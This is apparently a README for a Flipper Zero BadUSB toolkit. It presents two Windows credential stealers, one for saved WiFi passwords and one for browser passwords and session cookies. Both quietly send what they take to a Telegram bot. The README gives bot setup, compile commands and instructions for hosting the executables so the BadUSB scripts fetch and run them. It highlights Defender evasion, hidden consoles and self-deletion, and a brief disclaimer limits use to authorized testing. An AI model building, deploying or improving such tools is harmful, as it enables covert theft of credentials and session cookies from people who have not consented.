# Flipper Zero Toolkit

Author: Tsali
Twitch: TsaliThighmane
OF: Tsali
bsky: @cultofjames.org
Site: cultofjames.org

A collection of Flipper Zero BadUSB scripts and custom tools for authorized penetration testing.

CERO MIEDO

---

## Tools

### WiFi Password Grabber (`badusb/wifi/`)

Extracts all saved WiFi passwords from Windows 10/11 using the native WLAN API. **Bypasses Windows Defender** — no PowerShell, no netsh, no flagged commands.

- Calls `WlanEnumInterfaces` / `WlanGetProfile` directly
- Hidden console, self-deleting, no trace
- Exfiltrates to Telegram bot
- Reports: hostname, username, public + private IP
- ~5 second runtime

### Browser Password & Cookie Grabber (`badusb/browser/`)

Extracts saved credentials from **7 browsers** + session cookies:

| Browser | Status |
|---------|--------|
| Chrome | URLs + usernames + passwords (pre-v127) + cookies |
| Edge | URLs + usernames + passwords (pre-v127) + cookies |
| Opera / Opera GX | URLs + usernames + passwords (pre-v127) + cookies |
| Brave | URLs + usernames + passwords (pre-v127) + cookies |
| Vivaldi | URLs + usernames + passwords (pre-v127) + cookies |
| Firefox | Encrypted creds + key4.db (offline crack with firepwd.py) |

**Note:** Chrome v127+ (v20 encryption) passwords can't currently be decrypted. URLs and usernames are still captured.

---

## Setup

### 1. Telegram Bot
- Message `@BotFather` → `/newbot` → save token
- Message `@userinfobot` → get chat ID

### 2. Compile
Edit `tools/src/*.c` — replace `YOUR_BOT_TOKEN_HERE` and `YOUR_CHAT_ID_HERE`:
```
cl /O2 /Fe:wifi_grab.exe wifi_grab.c wlanapi.lib ole32.lib advapi32.lib user32.lib
cl /O2 /Fe:browser_grab.exe browser_grab.c crypt32.lib bcrypt.lib shell32.lib advapi32.lib user32.lib ole32.lib
```

### 3. Host & Deploy
- Upload compiled `.exe` to your web server
- Update BadUSB scripts with your server URL
- Copy scripts to Flipper's `badusb/` folder

---

## Why Custom EXEs?

Windows Defender (2026) catches all common approaches:
- `netsh wlan key=clear` — flagged
- PowerShell AMSI bypass — flagged
- WebBrowserPassView — flagged
- UAC bypass (fodhelper/computerdefaults) — flagged

Custom tools using native Windows APIs have no known signatures.

---

## Legal

**Authorized penetration testing only.** Only use on systems you own or have explicit written permission to test.
